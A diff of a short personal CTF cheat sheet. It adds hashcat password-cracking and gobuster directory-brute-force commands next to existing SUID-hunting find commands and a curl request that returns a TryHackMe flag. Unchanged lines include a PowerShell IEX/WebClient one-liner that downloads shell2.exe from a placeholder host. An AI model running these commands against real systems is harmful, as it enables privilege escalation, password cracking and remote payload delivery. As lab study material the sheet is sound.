@@ -4,6 +4,7 @@ Just my write up for CTF
 # SUID
 ```console
 $ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null # scan the whole file system to find all files with the SUID bit set that is own by root
+$ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null
 $ find / -perm -u=s -type f 2>/dev/null
 $ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null # same as about but own by any user
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # both SUID and SUIG
@@ -14,7 +15,14 @@ $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/nul
 powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
 powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
 ```
-
+# Hashcat
+```console
+hashcat -m <op> -a 0 -o crack.txt 'hash' /usr/share/wordlists/rockyou.txt --force
+```
+# gobuster
+```console
+gobuster dir -u http://<ip>/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
+```
 # curl
 ```console
 kali@kali:~$ curl http://10.10.10.204:8081/ctf/get
@@ -38,5 +46,3 @@ Content-Type: text/plain; charset=utf-8
 
 thm{c10b5cb7546f359d19c747db2d0f47b3}
 ```
-
-find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null
